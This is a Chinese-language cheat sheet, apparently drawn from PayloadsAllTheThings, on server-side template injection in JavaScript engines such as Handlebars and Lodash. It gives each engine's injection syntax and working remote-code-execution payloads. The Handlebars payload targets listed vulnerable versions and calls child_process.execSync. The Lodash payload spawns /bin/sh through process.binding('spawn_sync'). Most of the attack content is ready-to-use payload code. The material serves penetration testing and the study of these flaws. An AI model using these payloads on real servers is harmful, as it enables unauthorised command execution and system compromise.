# SSTI JavaScript - JavaScript服务端模板注入

[SEARCH_KEYWORDS]
漏洞类型: SSTI Server-Side Template Injection 服务端模板注入
攻击类型: Remote Code Execution File Read Information Disclosure
关键词: SSTI Handlebars EJS Pug Lodash Nunjucks Mustache Vue Dust Hogan
技术: Prototype Pollution constructor child_process spawn_sync templateSettings
框架: Handlebars EJS Pug Lodash DotJS DustJS HoganJS Nunjucks Underscore Vue

[CONTENT]

## SSTI JavaScript概述

服务端模板注入(SSTI)是一种漏洞，攻击者可在服务端模板中注入恶意代码，导致服务器执行任意命令。JavaScript中SSTI可发生在Handlebars、EJS、Pug等模板引擎。

## 模板库Payload格式

| 模板名 | Payload格式 |
|--------|-------------|
| DotJS | `{{= }}` |
| DustJS | `{}` |
| EJS | `<% %>` |
| HandlebarsJS | `{{ }}` |
| HoganJS | `{{ }}` |
| Lodash | `{{= }}` |
| MustacheJS | `{{ }}` |
| NunjucksJS | `{{ }}` |
| PugJS | `#{}` |
| TwigJS | `{{ }}` |
| UnderscoreJS | `<% %>` |
| VueJS | `{{ }}` |

## Handlebars

### 基本注入

```js
{{this}}
{{self}}
```

### 命令执行

适用于以下版本 (已在4.1.2/4.0.14/3.0.7修复):
- `>= 4.1.0`, `< 4.1.2`
- `>= 4.0.0`, `< 4.0.14`
- `< 3.0.7`

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Lodash

### 基本注入

创建模板:

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};
_.template(string, options);
```

基本Payload:

```javascript
{{= _.VERSION}}
${= _.VERSION}
<%= _.VERSION %>
```

### 命令执行

```js
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

## 参考文档

原始来源: PayloadsAllTheThings/Server Side Template Injection/JavaScript.md